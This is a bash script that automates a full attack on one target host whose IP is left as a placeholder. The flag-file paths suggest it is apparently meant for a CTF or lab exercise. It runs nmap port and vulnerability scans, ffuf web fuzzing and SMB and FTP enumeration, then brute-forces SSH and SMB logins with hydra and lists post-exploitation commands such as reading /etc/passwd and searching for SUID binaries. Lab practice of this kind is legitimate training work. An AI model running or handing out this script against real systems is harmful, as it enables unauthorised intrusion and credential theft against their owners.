#!/bin/bash
# SYSTEM 4: <UPDATE_NAME> - COMPLETE RECONNAISSANCE & EXPLOITATION
# Update IP, hostname, and OS type, then run

S4_IP="<UPDATE_IP>"
S4_NAME="<UPDATE_HOSTNAME>"
S4_OS="<UPDATE_OS>"  # Linux or Windows
OUTPUT_DIR="$HOME/Downloads/system4_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

cd "$OUTPUT_DIR"

echo "=========================================="
echo "SYSTEM 4: <UPDATE_NAME> - COMPLETE TEST"
echo "=========================================="

# ============================================
# PHASE 1: RECONNAISSANCE
# ============================================
echo "[*] Phase 1: Reconnaissance"

# Connectivity
ping -c 4 $S4_IP > 01_ping.txt 2>&1

# Port scans
nmap -sC -sV -oN 02_initial_scan.txt $S4_IP
nmap -p- --min-rate 2000 -oN 03_full_scan.txt $S4_IP

# Web enumeration (if port 80/443)
if nmap -p 80,443 $S4_IP | grep -q "open"; then
    curl -s -L http://$S4_IP/ > 04_web_root.html 2>&1
    curl -s http://$S4_IP/robots.txt > 05_robots.txt 2>&1
    curl -s http://$S4_IP/sitemap.xml > 06_sitemap.xml 2>&1
    ffuf -u http://$S4_IP/FUZZ -w ~/Downloads/seclists/Discovery/Web-Content/common.txt -mc 200,204,301,302,307,401,403 -t 50 -o 07_ffuf_common.json -s 2>/dev/null
fi

# SMB enumeration (if port 445)
if nmap -p 445 $S4_IP | grep -q "open"; then
    enum4linux -a $S4_IP > 08_enum4linux.txt 2>&1
    smbclient -L //$S4_IP/ -N > 09_smbclient.txt 2>&1
    smbmap -H $S4_IP > 10_smbmap.txt 2>&1
fi

# FTP enumeration (if port 21)
if nmap -p 21 $S4_IP | grep -q "open"; then
    ftp -n $S4_IP <<EOF > 11_ftp_anon.txt 2>&1
user anonymous anonymous
pwd
ls
quit
EOF
fi

# SSH banner (if port 22)
if nmap -p 22 $S4_IP | grep -q "open"; then
    nc $S4_IP 22 < /dev/null > 12_ssh_banner.txt 2>&1
fi

# RDP banner (if port 3389)
if nmap -p 3389 $S4_IP | grep -q "open"; then
    nc $S4_IP 3389 < /dev/null > 13_rdp_banner.txt 2>&1
fi

# ============================================
# PHASE 2: VULNERABILITY ANALYSIS
# ============================================
echo "[*] Phase 2: Vulnerability Analysis"

# Service-specific vulnerability scans
nmap --script vuln -oN 14_vuln_scan.txt $S4_IP

# Service-specific scripts
if nmap -p 80,443 $S4_IP | grep -q "open"; then
    nmap -p 80,443 --script http-enum,http-methods,http-headers -oN 15_web_enum.txt $S4_IP
fi

if nmap -p 445 $S4_IP | grep -q "open"; then
    nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln-* -oN 16_smb_enum.txt $S4_IP
fi

# ============================================
# PHASE 3: EXPLOITATION ATTEMPTS
# ============================================
echo "[*] Phase 3: Exploitation"

# SSH brute force (if port 22)
if nmap -p 22 $S4_IP | grep -q "open"; then
    echo "admin
root
user
test" > users_small.txt
    
    echo "admin
password
123456
Password123
admin123" > pass_small.txt
    
    hydra -L users_small.txt -P pass_small.txt ssh://$S4_IP -t 4 -o 17_ssh_brute.txt 2>&1
fi

# SMB brute force (if port 445)
if nmap -p 445 $S4_IP | grep -q "open"; then
    hydra -L users_small.txt -P pass_small.txt smb://$S4_IP -o 18_smb_brute.txt 2>&1
fi

# ============================================
# PHASE 4: POST-EXPLOITATION (if access gained)
# ============================================
echo "[*] Phase 4: Post-Exploitation (run if access gained)"

if [ "$S4_OS" = "Linux" ]; then
    echo "Linux commands:"
    echo "  - whoami"
    echo "  - id"
    echo "  - uname -a"
    echo "  - cat /etc/passwd"
    echo "  - sudo -l"
    echo "  - find / -perm -4000 2>/dev/null"
    echo "  - cat /root/root.txt 2>/dev/null"
    echo "  - cat /home/*/user.txt 2>/dev/null"
else
    echo "Windows commands:"
    echo "  - whoami"
    echo "  - hostname"
    echo "  - systeminfo"
    echo "  - type C:\\Users\\Administrator\\Desktop\\root.txt"
    echo "  - type C:\\Users\\Public\\user.txt"
fi

echo ""
echo "=========================================="
echo "SYSTEM 4: <UPDATE_NAME> - COMPLETE"
echo "=========================================="
echo "Results saved to: $OUTPUT_DIR"
ls -lh "$OUTPUT_DIR"

